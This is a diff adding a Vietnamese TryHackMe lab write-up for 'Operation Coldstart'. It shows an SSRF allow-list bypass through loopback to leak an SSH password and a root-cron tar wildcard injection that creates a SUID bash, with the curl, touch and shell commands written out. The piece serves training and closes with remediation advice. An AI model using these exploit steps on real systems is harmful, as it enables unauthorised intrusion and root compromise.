@@ -1,0 +1,150 @@
+---
+title: 'Operation Coldstart'
+description: 'FTP nặc danh làm lộ mã nguồn app; endpoint /preview là một SSRF chỉ được canh bằng allow-list hostname mà host được phép lại trỏ về loopback, nên ta chạm được trang admin chỉ-127.0.0.1 làm lộ mật khẩu SSH, rồi một cron tar wildcard-injection leo lên root.'
+date: 2026-06-24
+platform: tryhackme
+room: 'Operation Coldstart'
+roomUrl: 'https://tryhackme.com/room/operationcoldstart'
+difficulty: easy
+tags:
+  - 'web'
+  - 'ssrf'
+  - 'ftp'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'server-side request forgery'
+  - 'wildcard injection'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Operation Coldstart" trên TryHackMe (Volt Labs URL Preview). FTP nặc danh trao cho ta mã nguồn ứng dụng, nó hé lộ một server-side request forgery mà thứ duy nhất canh gác là một allow-list hostname — và host được phép lại trỏ về loopback. Điều đó cho phép ta chạm tới một trang admin chỉ dành cho 127.0.0.1, đọc một mật khẩu SSH, và kết thúc bằng một cron tar wildcard-injection kinh điển để lên root._
+
+> Operation Coldstart là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Cả hai flag và mật khẩu SSH khôi phục được đều hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+FTP nặc danh phục vụ `backup.tar.gz` → `app.py` giải nén ra cho thấy `/preview` là một **SSRF** mà kiểm tra duy nhất là `urlparse(url).hostname in ALLOWED_HOSTS` (chỉ `kestrel.thm`), **không kiểm tra scheme hay path** → `kestrel.thm` trỏ về **127.0.0.1** trên máy, và `/admin/` chỉ được canh bằng `remote_addr.startswith("127.")` → nên `?url=http://kestrel.thm/admin/notes` khiến server tự fetch ghi chú admin của chính nó, làm lộ **mật khẩu SSH của** **`webdev`** → SSH vào (user flag) → một cron root chạy `tar czf ... *` trong thư mục ghi được, nên thả các file `--checkpoint`/`--checkpoint-action` để **tar wildcard injection** → SUID bash → root (flag).
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy FTP thân thiện với anonymous, SSH, và một app web Gunicorn:
+
+```text
+21/tcp open  ftp   vsftpd 3.0.5     # Anonymous FTP login allowed
+22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
+80/tcp open  http  Gunicorn         # URL Preview - Volt Labs
+```
+
+FTP nặc danh chứa đúng một archive:
+
+```text
+ftp -A $IP        # login: anonymous
+# pub/backup.tar.gz
+tar -xvf backup.tar.gz   # voltlabs-preview/{app.py,README.md,requirements.txt}
+```
+
+### **Lỗ hổng**
+
+Đọc `app.py` là toàn bộ ván cờ. Route `/preview` fetch một URL do người dùng cung cấp nhưng chỉ kiểm tra **hostname** với một allow-list — chính lập trình viên còn đánh dấu nó trong comment:
+
+```text
+# VULN: hostname allow-list is the only check. No scheme check, no path check.
+host = (urlparse(target).hostname or "").lower()
+if host not in ALLOWED_HOSTS:   # ALLOWED_HOSTS = {"kestrel.thm"}
+    return "Host not in the approved internal allow-list", 403
+r = requests.get(target, timeout=3)   # full attacker-controlled path
+```
+
+Trong khi đó endpoint admin lại tin tưởng địa chỉ nguồn:
+
+```text
+@app.route("/admin/<path:p>")
+def admin(p="index"):
+    if not request.remote_addr.startswith("127."):
+        abort(403)
+    if p == "notes":
+        return open("/opt/voltlabs-preview/admin_notes.txt").read()
+```
+
+<Callout type="insight">
+
+Allow-list trông như một lớp phòng thủ nhưng lại chính là toàn bộ exploit: `kestrel.thm` được gim về **127.0.0.1** trong `/etc/hosts` của máy. Nên một request tới `http://kestrel.thm/admin/notes` vượt qua kiểm tra hostname, và vì server tự _nó_ fetch, trang admin thấy `remote_addr = 127.0.0.1` và giao ra bí mật. Một host được phép trỏ về loopback biến một SSRF thẳng thành một lần đọc admin từ “nguồn được tin cậy”.
+
+</Callout>
+
+### **Bước 1 — SSRF tới trang admin loopback → lộ mật khẩu SSH**
+
+Ta đưa cho endpoint preview một URL trên host được phép nhưng trỏ tới ghi chú admin. Server tự fetch `/admin/notes` của chính nó từ 127.0.0.1 và trả nội dung, chứa mật khẩu SSH của `webdev`:
+
+```text
+curl -G "http://$IP/preview" --data-urlencode 'url=http://kestrel.thm/admin/notes'
+# -> admin_notes.txt: webdev SSH password = <redacted>
+```
+
+### **Bước 2 — SSH thành webdev (flag)**
+
+```text
+ssh webdev@$IP
+webdev@coldstart:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 3 — tar wildcard injection → root (flag)**
+
+`webdev` không sudo được, nhưng `pspy` bắt được một cron chạy bởi root dùng wildcard:
+
+```text
+CMD: UID=0  PID=1587 | tar czf /var/backups/uploads.tgz *
+```
+
+Khi `tar ... *` chạy trong một thư mục ta ghi được, shell mở rộng `*` thành các tên file đang có — nên các file được đặt tên giống option của tar sẽ được trao cho tar như cờ thật. `--checkpoint-action=exec=` chạy một lệnh tại mỗi checkpoint, dưới quyền root:
+
+```text
+cd /opt/backups          # thư mục ghi được mà cron glob vào
+echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+# chờ nhịp cron kế tiếp...
+/tmp/bash -p             # SUID bash -> euid 0
+# cat /root/flag.txt -> THM{<redacted>}
+```
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Cao — CVSS 3.1 \~8.6** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L`). Một SSRF chưa xác thực chạm tới một endpoint admin nội bộ tin tưởng loopback, làm lộ một credential SSH và cho một bàn đạp tương tác. Một cron root glob vào một thư mục kẻ tấn công ghi được bằng `tar *` sau đó cho phép wildcard injection và leo thang SUID-bash lên root đầy đủ — xâm phạm hoàn toàn host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Sửa SSRF cho đúng.** Một allow-list hostname là không đủ: ép scheme (chỉ `http`/`https`), phân giải và từ chối các địa chỉ private/loopback, và đừng chuyển tiếp toàn bộ path do kẻ tấn công kiểm soát. Tốt hơn, bỏ hẳn chức năng fetch theo input người dùng.
+- **Không xác thực bằng IP nguồn.** `remote_addr == 127.0.0.1` dễ dàng thỏa mãn qua SSRF; hãy yêu cầu một phiên admin thật.
+- **Không bao giờ chạy** **`tar *`** **(hay bất kỳ glob nào) từ một thư mục ghi được trong cron đặc quyền.** Dùng danh sách file tuyệt đối, `--` để kết thúc option, hoặc `find ... -print0 | tar --null -T -`.
+- **Không để archive mã nguồn trên FTP nặc danh.**
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một allow-list trỏ về loopback là một cánh cửa mở.** “Host duy nhất được duyệt” lại chính là host nội bộ.
+- **SSRF + tin tưởng theo IP = bypass xác thực.** Server trở thành client được tin cậy của chính nó.
+- **`tar *`** **trong thư mục ghi được là root.** Chèn option qua tên file cấu tạo là một trong những chiêu cron cũ nhất — và vẫn chạy.
+
+Operation Coldstart là bài học gọn về việc các kiểm tra “phòng thủ” (một allow-list, một cổng IP) trở thành chính exploit. Cảm ơn đã đọc.
